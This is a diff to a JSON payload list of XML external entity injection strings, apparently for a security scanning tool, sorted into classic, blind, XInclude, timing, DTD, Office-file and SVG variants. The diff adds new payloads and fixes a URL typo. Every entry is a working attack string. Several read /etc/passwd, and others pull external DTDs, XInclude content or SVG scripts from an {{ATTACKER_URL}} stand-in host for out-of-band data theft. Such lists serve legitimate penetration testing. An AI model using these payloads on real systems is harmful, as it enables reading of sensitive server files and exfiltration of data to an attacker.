@@ -1,7 +1,7 @@
 {
     "classic": [
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo></foo>",
-        "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"{{ATTACKER_URL}}//evil.dtd\">%ext;]>"
+        "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"{{ATTACKER_URL}}/evil.dtd\">%ext;]>"
     ],
     "blind": [
         "<?xml version=\"1.0\" ?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"{{ATTACKER_URL}}/xxe.dtd\"> %xxe; ]><test></test>",
@@ -33,7 +33,8 @@
         "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo></foo>"
     ],
     "xinclude_attack": [
-        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo><xi:include href=\"file:///etc/passwd\" parse=\"xml\"/></foo>"
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo><xi:include href=\"file:///etc/passwd\" parse=\"xml\"/></foo>",
+        "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"{{ATTACKER_URL}}/sensitive-data.xml\" parse=\"text\"/></foo>"
     ],
     "timing_attack": [
         "<?xml version=\"1.0\" ?><!DOCTYPE root [ <!ENTITY % data SYSTEM \"{{ATTACKER_URL}}/xxe-timing.dtd\">%data; ]><root></root>"
@@ -62,5 +63,19 @@
     "adaptive_xxe": [
         "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[<&xxe;]>]]></foo>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"{{TARGET_URL}}/conditional.dtd\"><!ENTITY % cond '<![ %dtd;[<&xxe;]>]]>'>]><foo>%cond;</foo>"
+    ],
+    "dtd": [
+        "<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"{{ATTACKER_URL}}/dtd.dtd\">%dtd;]><foo>&local_dtd;</foo>",
+        "<!DOCTYPE foo [<!ENTITY % recursive SYSTEM \"{{ATTACKER_URL}}/recursive.dtd\">%recursive;]>"
+    ],
+    "office_files": [
+        "<?xml version=\"1.0\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"file:///etc/passwd\"/></Relationships>"
+    ],
+    "svg_files": [
+        "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"{{ATTACKER_URL}}/xxe.svg\" /></svg>",
+        "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script href=\"{{ATTACKER_URL}}/xxe.js\"></script></svg>"
+    ],
+    "oob_svg_rasterization": [
+        "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"{{ATTACKER_URL}}/oob.svg\" /></svg>"
     ]
 }
